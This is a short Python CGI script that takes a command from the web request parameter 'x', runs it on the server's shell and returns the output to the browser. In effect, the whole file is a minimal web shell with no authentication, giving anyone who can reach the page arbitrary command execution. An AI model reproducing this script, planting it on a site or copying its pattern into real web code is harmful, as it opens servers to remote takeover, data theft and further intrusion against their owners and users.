#! /usr/bin/python3

import cgi
import subprocess
import time

print('Content-type: text/html')
print()


f=cgi.FieldStorage()
cmd=f.getvalue('x')

o=subprocess.getoutput(cmd)
print('>_')
print(o)
